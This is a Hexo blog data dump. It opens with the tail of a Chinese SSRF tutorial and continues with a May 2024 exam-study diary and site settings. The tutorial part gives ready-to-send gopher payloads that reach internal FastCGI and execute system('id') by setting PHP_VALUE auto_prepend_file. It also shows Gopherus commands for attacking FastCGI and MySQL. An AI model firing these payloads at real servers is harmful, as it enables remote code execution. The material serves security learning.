open(‘fcg_exp.txt’,’r’)<br>payload &#x3D; file.read()<br>print(“gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_“+quote(payload).replace(“%0A”,”%0D”).replace(“%2F”,”&#x2F;“))</p>\n<p>执行上面的python脚本生成如下payload：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg\"\n                        alt=\"image-20210113210102251\"\n                 ></p>\n<p>这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url&#x3D;后面发送过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E</span><br></pre></td></tr></table></figure>\n\n<p>如下图所示，命令执行成功：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small\"\n                        alt=\"image-20210113211227610\"\n                 ></p>\n<h3 id=\"使用Gopherus工具攻击\"><a href=\"#使用Gopherus工具攻击\" class=\"headerlink\" title=\"使用Gopherus工具攻击\"></a>使用Gopherus工具攻击</h3><p>下载地址：<a class=\"link\"   href=\"https://github.com/tarunkant/Gopherus\" >https://github.com/tarunkant/Gopherus<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。</p>\n<p>使用Gopherus工具生成攻击FastCGI的payload：</p>\n<p>python gopherus.py –exploit fastcgi<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php    # 这里输入的是一个已知存在的php文件<br>id    # 输入一个你要执行的命令</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small\"\n                        alt=\"image-20201206134630782\"\n                 ></p>\n<p>然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url&#x3D;后面打过去过去：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg\"\n                        alt=\"image-20210113211649519\"\n                 ></p>\n<p>命令执行成功。</p>\n<h2 id=\"攻击内网MySql\"><a href=\"#攻击内网MySql\" class=\"headerlink\" title=\"攻击内网MySql\"></a>攻击内网MySql</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg\"\n                        alt=\"20210113152106.png\"\n                 ></p>\n<p>首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战&#x2F;应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。</p>\n<p>登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p>\n<p>测试环境如下：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small\"\n                        alt=\"image-20210113225607672\"\n                 ></p>\n<p>Ubuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。</p>\n<p>下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：</p>\n<p>python gopherus.py –exploit mysql<br>whoami    # 登录用的用户名<br>show databases;    # 登录后要执行的sql语句</p>\n<p>生成如下payload：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small\"\n                        alt=\"image-20210114004602164\"\n                 ></p>\n<p>将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url&#x3D;后面发送打过去就行了。但是我这里失败了，不知道为什么……</p>\n<h2 id=\"Ending……\"><a href=\"#Ending……\" class=\"headerlink\" title=\"Ending……\"></a>Ending……</h2><p>推荐一个SSRF练习靶场：</p>\n<ul>\n<li>ssrf-lab：<a class=\"link\"   href=\"https://github.com/fengwenhua/ssrf-lab\" >https://github.com/fengwenhua/ssrf-lab<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p>该靶场有一个好看又简洁的界面，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。配置请看：<a class=\"link\"   href=\"https://www.heibai.org/post/1287.html\" >https://www.heibai.org/post/1287.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg\"\n                        alt=\"20210112124413.jpg\"\n                 ></p>\n<p>本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。</p>\n<p>个人博客：<a class=\"link\"   href=\"https://whoamianony.top/\" >https://whoamianony.top/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<blockquote>\n<p>参考： <a class=\"link\"   href=\"https://blog.csdn.net/Ping_Pig/article/details/99412487\" >https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;99412487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iors/p/9777571.html\" >https://www.cnblogs.com/iors/p/9777571.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app\" >https://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;104528645?utm_source&#x3D;app<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://xz.aliyun.com/t/2115\" >https://xz.aliyun.com/t/2115<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_36343353/article/details/112277580\" >https://blog.csdn.net/weixin_36343353&#x2F;article&#x2F;details&#x2F;112277580<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/cj_Allen/article/details/106855893\" >https://blog.csdn.net/cj_Allen&#x2F;article&#x2F;details&#x2F;106855893<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF\" >https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >https://bbs.ichunqiu.com/thread-58455-1-1.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.chaitin.cn/gopher-attack-surfaces/\" >https://blog.chaitin.cn/gopher-attack-surfaces/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/197431#h2-6\" >https://www.anquanke.com/post/id/197431#h2-6<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/145519#h2-14\" >https://www.anquanke.com/post/id/145519#h2-14<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n"},{"title":"2024 May","date":"2024-04-30T16:00:00.000Z","excerpt":"May","_content":"\n\n\n# 2024 May\n\n\n\n## 5.6\n\n\n\n算是正式开始学习了吧，以后和wjh约定好每天来图书馆，希望每天能学习13h+\n\n\n\n### Math\n\n- 第九讲中的 变限积分的计算学完，题目未刷 p177\n\n\n\n### English\n\n- 等下回去记100个单词（x\n\n\n\n### 408\n\n- 串的知识完结，学完kmp算法，回去巩固一下！\n\n\n\n还是那句话，贵在坚持，一定要坚持下去呀\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\" alt=\"IMG_2889\" style=\"zoom: 33%;\" />\n\n\n\n\n\n\n\n## 5.7\n\n\n\n今天学习状态貌似还不错？\n\n\n\n### Math\n\n- 第9讲完结 p186\n\n第九讲算是开始了计算之旅，有很多没有想到的方法，感觉这个东西是个熟能生巧的事情，希望后面多刷题，练练脑子，题目越学写越快吧\n\n\n\n### English\n\n- 记单词 50个\n\n目前想法是每天早上记半个小时，然后晚上吃饭回来休息的时候记半个小时，暂定这样吧\n\n\n\n### 408\n\n- 二叉树遍历刚学 p145\n\n感觉408比数一简单些？也许是我的错觉，但感觉408越学越有意思了？\n\n感觉都是一些概念性的东西偏多，可以多做一些小程序的选择题\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\" style=\"zoom:33%;\" />\n\n\n\n\n\n## 5.8\n\n感觉今天状态更好了？除了早上iscc第二周刚开始，要一直速度交flag，下午才来的图书馆，状态还行，wjh下午也来了,希望能够坚持下去吧，今天终于记单词了！\n\n\n\n### Math\n\n- 第九讲计算重温了一下\n- 第十讲开了个头 p190\n\n\n\n### English\n\n- 记了50个单词加油。。。\n\n\n\n### 408\n\n- 二叉树5.3视频看完，题未写完 p155\n\n感觉二叉树的遍历还需要多啃一啃 感觉挺好玩的，看看晚上能不能把剩下的题写完\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\" alt=\"IMG_2897\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.9\n\n今天过的也是比较充实，比较欣慰的一点是，开始记单词了（终于\n\n中午和好朋友在家里吃了自己蒸的生蚝，就是差一点蒜蓉酱，互相谈论了一下考研，\n\n能坚持下来就是成功！也就辛苦最后8个月！\n\n\n\n### Math\n\n- 第十讲看完，题未做 p200\n- 准备明天把前十讲题目做完\n\n\n\n最近越发感觉到了计算量，很多题都没思路，但刷了一些题后，感觉好多了\n\n感觉就是个熟能生巧的事情后期多刷一点题目吧\n\n\n\n### English\n\n- 60+52 /43min\n\n\n\n也算是开始好起来了呀，后期预计每天花1h+，学习100+复习100\n\n\n\n### 408\n\n- 树，森林 学完，题未做完 p183\n\n\n\n感觉数据结构，学起来挺有意思，蛮喜欢推理的过程，坚持下去！\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\" alt=\"IMG_2901\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.10\n\n\n\n今天只学了半天吧，感觉状态一般般吧，希望能延续下去\n\n\n\n\n\n### Math\n\n- 将前面的题目都复现了一下\n\n狠狠的刷题，狠狠的总结\n\n\n\n\n\n### English\n\n- 记单词\n\n记单词，坚持下去吧！\n\n\n\n\n\n\n\n### 408\n\n- 没复习（我的错！！）\n\n\n\n总的来说就是，今天因为项目管理的实验，干扰了我的计划呜呜，明天一定坚持下来\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\" alt=\"IMG_2913\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.11\n\n- 喝了人生中的第一杯星巴克\n\n![IMG_2925(1)](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG)\n\n- ktv爽唱四小时\n\n\n\n\n\n\n\n## 5.12\n\n今天去参加湖北省信创，题目比较简单，第三名拿下了金奖\n\nweb发挥的不错，两个靶机全部解出来了\n\n后期好好学习一下批量脚本利用，放一些照片吧\n\n\n\n![Xnip2024-05-12_12-42-33](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg)\n\n\n\n![4e462780ed0f89e5da35f90564ba25be](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg)\n\n后续要好好认真复习了，还有期末考试的内容，速成吧...\n\n\n\n\n\n## 5.13\n\n今天复习了软件测试和算法，突然一下子感觉算法也没有那么难？？\n\n可能是那个老师讲的太好了\n","source":"_posts/May.md","raw":"---\ntitle: 2024 May\ndate: 2024-05-01 00:00:00\nexcerpt: May\ncategories: 考研\n---\n\n\n\n# 2024 May\n\n\n\n## 5.6\n\n\n\n算是正式开始学习了吧，以后和wjh约定好每天来图书馆，希望每天能学习13h+\n\n\n\n### Math\n\n- 第九讲中的 变限积分的计算学完，题目未刷 p177\n\n\n\n### English\n\n- 等下回去记100个单词（x\n\n\n\n### 408\n\n- 串的知识完结，学完kmp算法，回去巩固一下！\n\n\n\n还是那句话，贵在坚持，一定要坚持下去呀\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\" alt=\"IMG_2889\" style=\"zoom: 33%;\" />\n\n\n\n\n\n\n\n## 5.7\n\n\n\n今天学习状态貌似还不错？\n\n\n\n### Math\n\n- 第9讲完结 p186\n\n第九讲算是开始了计算之旅，有很多没有想到的方法，感觉这个东西是个熟能生巧的事情，希望后面多刷题，练练脑子，题目越学写越快吧\n\n\n\n### English\n\n- 记单词 50个\n\n目前想法是每天早上记半个小时，然后晚上吃饭回来休息的时候记半个小时，暂定这样吧\n\n\n\n### 408\n\n- 二叉树遍历刚学 p145\n\n感觉408比数一简单些？也许是我的错觉，但感觉408越学越有意思了？\n\n感觉都是一些概念性的东西偏多，可以多做一些小程序的选择题\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\" style=\"zoom:33%;\" />\n\n\n\n\n\n## 5.8\n\n感觉今天状态更好了？除了早上iscc第二周刚开始，要一直速度交flag，下午才来的图书馆，状态还行，wjh下午也来了,希望能够坚持下去吧，今天终于记单词了！\n\n\n\n### Math\n\n- 第九讲计算重温了一下\n- 第十讲开了个头 p190\n\n\n\n### English\n\n- 记了50个单词加油。。。\n\n\n\n### 408\n\n- 二叉树5.3视频看完，题未写完 p155\n\n感觉二叉树的遍历还需要多啃一啃 感觉挺好玩的，看看晚上能不能把剩下的题写完\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\" alt=\"IMG_2897\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.9\n\n今天过的也是比较充实，比较欣慰的一点是，开始记单词了（终于\n\n中午和好朋友在家里吃了自己蒸的生蚝，就是差一点蒜蓉酱，互相谈论了一下考研，\n\n能坚持下来就是成功！也就辛苦最后8个月！\n\n\n\n### Math\n\n- 第十讲看完，题未做 p200\n- 准备明天把前十讲题目做完\n\n\n\n最近越发感觉到了计算量，很多题都没思路，但刷了一些题后，感觉好多了\n\n感觉就是个熟能生巧的事情后期多刷一点题目吧\n\n\n\n### English\n\n- 60+52 /43min\n\n\n\n也算是开始好起来了呀，后期预计每天花1h+，学习100+复习100\n\n\n\n### 408\n\n- 树，森林 学完，题未做完 p183\n\n\n\n感觉数据结构，学起来挺有意思，蛮喜欢推理的过程，坚持下去！\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\" alt=\"IMG_2901\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.10\n\n\n\n今天只学了半天吧，感觉状态一般般吧，希望能延续下去\n\n\n\n\n\n### Math\n\n- 将前面的题目都复现了一下\n\n狠狠的刷题，狠狠的总结\n\n\n\n\n\n### English\n\n- 记单词\n\n记单词，坚持下去吧！\n\n\n\n\n\n\n\n### 408\n\n- 没复习（我的错！！）\n\n\n\n总的来说就是，今天因为项目管理的实验，干扰了我的计划呜呜，明天一定坚持下来\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\" alt=\"IMG_2913\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.11\n\n- 喝了人生中的第一杯星巴克\n\n![IMG_2925(1)](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG)\n\n- ktv爽唱四小时\n\n\n\n\n\n\n\n## 5.12\n\n今天去参加湖北省信创，题目比较简单，第三名拿下了金奖\n\nweb发挥的不错，两个靶机全部解出来了\n\n后期好好学习一下批量脚本利用，放一些照片吧\n\n\n\n![Xnip2024-05-12_12-42-33](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg)\n\n\n\n![4e462780ed0f89e5da35f90564ba25be](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg)\n\n后续要好好认真复习了，还有期末考试的内容，速成吧...\n\n\n\n\n\n## 5.13\n\n今天复习了软件测试和算法，突然一下子感觉算法也没有那么难？？\n\n可能是那个老师讲的太好了\n","slug":"May","published":1,"updated":"2024-05-13T15:16:46.973Z","_id":"clvv05u7500006y7648fcbq3l","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-May\"><a href=\"#2024-May\" class=\"headerlink\" title=\"2024 May\"></a>2024 May</h1><h2 id=\"5-6\"><a href=\"#5-6\" class=\"headerlink\" title=\"5.6\"></a>5.6</h2><p>算是正式开始学习了吧，以后和wjh约定好每天来图书馆，希望每天能学习13h+</p>\n<h3 id=\"Math\"><a href=\"#Math\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第九讲中的 变限积分的计算学完，题目未刷 p177</li>\n</ul>\n<h3 id=\"English\"><a href=\"#English\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>等下回去记100个单词（x</li>\n</ul>\n<h3 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>串的知识完结，学完kmp算法，回去巩固一下！</li>\n</ul>\n<p>还是那句话，贵在坚持，一定要坚持下去呀</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\"\n                         alt=\"IMG_2889\" style=\"zoom: 33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-7\"><a href=\"#5-7\" class=\"headerlink\" title=\"5.7\"></a>5.7</h2><p>今天学习状态貌似还不错？</p>\n<h3 id=\"Math-1\"><a href=\"#Math-1\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第9讲完结 p186</li>\n</ul>\n<p>第九讲算是开始了计算之旅，有很多没有想到的方法，感觉这个东西是个熟能生巧的事情，希望后面多刷题，练练脑子，题目越学写越快吧</p>\n<h3 id=\"English-1\"><a href=\"#English-1\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记单词 50个</li>\n</ul>\n<p>目前想法是每天早上记半个小时，然后晚上吃饭回来休息的时候记半个小时，暂定这样吧</p>\n<h3 id=\"408-1\"><a href=\"#408-1\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>二叉树遍历刚学 p145</li>\n</ul>\n<p>感觉408比数一简单些？也许是我的错觉，但感觉408越学越有意思了？</p>\n<p>感觉都是一些概念性的东西偏多，可以多做一些小程序的选择题</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\"\n                         style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n<h2 id=\"5-8\"><a href=\"#5-8\" class=\"headerlink\" title=\"5.8\"></a>5.8</h2><p>感觉今天状态更好了？除了早上iscc第二周刚开始，要一直速度交flag，下午才来的图书馆，状态还行，wjh下午也来了,希望能够坚持下去吧，今天终于记单词了！</p>\n<h3 id=\"Math-2\"><a href=\"#Math-2\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第九讲计算重温了一下</li>\n<li>第十讲开了个头 p190</li>\n</ul>\n<h3 id=\"English-2\"><a href=\"#English-2\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记了50个单词加油。。。</li>\n</ul>\n<h3 id=\"408-2\"><a href=\"#408-2\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>二叉树5.3视频看完，题未写完 p155</li>\n</ul>\n<p>感觉二叉树的遍历还需要多啃一啃 感觉挺好玩的，看看晚上能不能把剩下的题写完</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\"\n                         alt=\"IMG_2897\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-9\"><a href=\"#5-9\" class=\"headerlink\" title=\"5.9\"></a>5.9</h2><p>今天过的也是比较充实，比较欣慰的一点是，开始记单词了（终于</p>\n<p>中午和好朋友在家里吃了自己蒸的生蚝，就是差一点蒜蓉酱，互相谈论了一下考研，</p>\n<p>能坚持下来就是成功！也就辛苦最后8个月！</p>\n<h3 id=\"Math-3\"><a href=\"#Math-3\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第十讲看完，题未做 p200</li>\n<li>准备明天把前十讲题目做完</li>\n</ul>\n<p>最近越发感觉到了计算量，很多题都没思路，但刷了一些题后，感觉好多了</p>\n<p>感觉就是个熟能生巧的事情后期多刷一点题目吧</p>\n<h3 id=\"English-3\"><a href=\"#English-3\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>60+52 &#x2F;43min</li>\n</ul>\n<p>也算是开始好起来了呀，后期预计每天花1h+，学习100+复习100</p>\n<h3 id=\"408-3\"><a href=\"#408-3\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>树，森林 学完，题未做完 p183</li>\n</ul>\n<p>感觉数据结构，学起来挺有意思，蛮喜欢推理的过程，坚持下去！</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\"\n                         alt=\"IMG_2901\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-10\"><a href=\"#5-10\" class=\"headerlink\" title=\"5.10\"></a>5.10</h2><p>今天只学了半天吧，感觉状态一般般吧，希望能延续下去</p>\n<h3 id=\"Math-4\"><a href=\"#Math-4\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>将前面的题目都复现了一下</li>\n</ul>\n<p>狠狠的刷题，狠狠的总结</p>\n<h3 id=\"English-4\"><a href=\"#English-4\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>记单词</li>\n</ul>\n<p>记单词，坚持下去吧！</p>\n<h3 id=\"408-4\"><a href=\"#408-4\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>没复习（我的错！！）</li>\n</ul>\n<p>总的来说就是，今天因为项目管理的实验，干扰了我的计划呜呜，明天一定坚持下来</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\"\n                         alt=\"IMG_2913\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-11\"><a href=\"#5-11\" class=\"headerlink\" title=\"5.11\"></a>5.11</h2><ul>\n<li>喝了人生中的第一杯星巴克</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG\"\n                        alt=\"IMG_2925(1)\"\n                 ></p>\n<ul>\n<li>ktv爽唱四小时</li>\n</ul>\n<h2 id=\"5-12\"><a href=\"#5-12\" class=\"headerlink\" title=\"5.12\"></a>5.12</h2><p>今天去参加湖北省信创，题目比较简单，第三名拿下了金奖</p>\n<p>web发挥的不错，两个靶机全部解出来了</p>\n<p>后期好好学习一下批量脚本利用，放一些照片吧</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg\"\n                        alt=\"Xnip2024-05-12_12-42-33\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg\"\n                        alt=\"4e462780ed0f89e5da35f90564ba25be\"\n                 ></p>\n<p>后续要好好认真复习了，还有期末考试的内容，速成吧…</p>\n<h2 id=\"5-13\"><a href=\"#5-13\" class=\"headerlink\" title=\"5.13\"></a>5.13</h2><p>今天复习了软件测试和算法，突然一下子感觉算法也没有那么难？？</p>\n<p>可能是那个老师讲的太好了</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-May\"><a href=\"#2024-May\" class=\"headerlink\" title=\"2024 May\"></a>2024 May</h1><h2 id=\"5-6\"><a href=\"#5-6\" class=\"headerlink\" title=\"5.6\"></a>5.6</h2><p>算是正式开始学习了吧，以后和wjh约定好每天来图书馆，希望每天能学习13h+</p>\n<h3 id=\"Math\"><a href=\"#Math\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>第九讲中的 变限积分的计算学完，题目未刷 p177</li>\n</ul>\n<h3 id=\"English\"><a href=\"#English\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>等下回去记100个单词（x</li>\n</ul>\n<h3 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>串的知识完结，学完kmp算法，回去巩固一下！</li>\n</ul>\n<p>还是那句话，贵在坚持，一定要坚持下去呀</p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       